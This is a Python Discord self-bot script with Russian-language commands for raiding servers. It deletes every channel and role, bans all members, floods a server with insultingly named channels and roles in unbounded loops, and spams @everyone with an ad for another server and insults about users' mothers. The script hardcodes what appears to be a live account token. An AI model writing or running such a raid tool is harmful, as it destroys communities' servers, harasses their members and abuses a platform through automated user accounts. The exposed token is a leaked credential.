import discord
from discord.ext import commands
import random

client = commands.Bot(command_prefix = 'sb!', self_bot = True)
client.remove_command("help")

TOKEN = "OTg1OTI1OTQ5Njk2NjQzMTMy.GpA3B1.M1lZB6PPBUUw5z47tiKfMCiEhh4QIwufZrrv9E"

i = 100
spam = 0
SKIP_BOTS = False
t = 0

@client.command(pass_context = True)
async def bot(message):

    text = """**деревенский холодильник**

    **sb!spam + text** - ну типа спамит тем чо ты напишеш
    **sb!spamdef** - спамить рекламой диревня в маинкравте
    **sb!chancreate** - ну тип саздает каналы глупые
    **sb!chandel** - удалить каналы все
    **sb!rolescreate** - создать роли ТУПЫЕ
    **sb!rolesdel** - удаляит все роли
    **sb!cons** - ну тип управление чирез консоль"""

    await message.channel.send(text)

@client.command()
async def print(ctx, *, text):

    await ctx.send(embed = discord.Embed(description = text))

@client.command()
async def chancreate(ctx):

    guild = ctx.guild

    while i > 0:

        await guild.create_text_channel(name = "атака-деревни")

@client.command()
async def chandel(ctx):

    for c in ctx.guild.channels:

        await c.delete()

@client.command()
async def spam(ctx, *, text):
    spam = 50

    while spam > 0:

        spam -= 1

        await ctx.send(text + " " +str(random.randrange(1,300)))

@client.command()
async def spamdef(ctx):

    s = 0

    count = 50

    while s < count:

        count -= 1

        await ctx.send("""За диревню!
Мы абъявили вайну всей автапартнерке и мы пабедим!!!!
@everyone @here
наш сирвир самы лучшы в дискорди кто ни зайдит у таво мать сдохла
https://discord.gg/nPgtEkkxs8""" + " " +str(random.randrange(1,300)))

@client.command()
async def rolescreate(ctx):

    guild = ctx.guild

    while i > 0:

        await guild.create_role(name="У ТИБЯ МАМА ЗДОХЛА")

@client.command()
async def banall(ctx):

    for m in ctx.guild.members:

        try:

            await m.ban(reason="мама здохла")

        except:

            pass

@client.command()
async def rolesdel(ctx):

    for role in ctx.guild.roles:

        try:

            await role.delete()

        except:

            print("Cannot delete " + role.name)

@client.command()
async def cons(ctx):

    while True:

        switcher = int(input("1 - chandel\n2 - rolesdel\n3 - chancreate\n4 - rolescreate\n5 - spamdef\nChoose function: "))

        if switcher == 1:

            for c in ctx.guild.channels:

                await c.delete()

        if switcher == 2:

            for role in ctx.guild.roles:

                try:

                    await role.delete()

                except:

                    print("Cannot delete " + role.name)

        if switcher == 3:

            guild = ctx.guild

            while i > 0:

                await guild.create_text_channel(name = "атака-диревни")

        if switcher == 4:

            guild = ctx.guild

            while i > 0:

                await guild.create_role(name="МАМА ЗДОХЛА")

        if switcher == 5:

            s = 0

            count = 50

            while s < count:

                count -= 1

                await ctx.send("""**За диревню!**
@everyone @here @everyone @here
**Мы абъявили вайну всей автапартнерке и мы пабедим!!!!**
**наш сирвир самы лучшы в дискорди кто ни зайдит у таво мать сдохла**
https://discord.gg/nPgtEkkxs8""" + " " +str(random.randrange(1,300)))

client.run(TOKEN, bot = False)
